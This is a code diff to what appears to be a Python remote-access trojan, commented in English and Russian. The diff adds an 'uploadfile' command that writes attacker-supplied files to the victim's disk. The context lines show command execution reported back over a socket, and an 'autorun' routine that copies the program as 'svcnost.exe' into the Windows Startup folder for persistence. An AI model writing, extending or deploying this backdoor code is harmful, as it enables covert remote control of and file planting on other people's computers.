@@ -52,12 +52,24 @@ while True:
                         sock.send(bytes(pwd, encoding="utf-8", errors="ignore"))
                     except Exception as ex:
                         sock.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
+                elif comm == 'uploadfile':
+                    filename = sock.recv(1024)
+                    # fname = open('./asd.pdf', 'wb')
+                    fname = open('./' + filename, 'wb')
+                    while True:
+                        strng = sock.recv(1024)
+                        if strng:
+                            fname.write(strng)
+                        else:
+                            fname.close()
+                            break
                 elif comm == 'autorun':
                         # Name of the compiled file / Имя скомпилированного файла
                         filename = "svcnost.exe"
                         # Windows username/ Имя пользователя Windows
                         username = os.getlogin()
-                        # Path to startup folder / Путь к папке с автозагрузкой
+                        # Path to startup folder / Путь к папке
+                        # с автозагрузкой
                         startup = (r'C:/Users/' + username + r'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
 
                         # Check if file already exist / Проверка существует ли файл
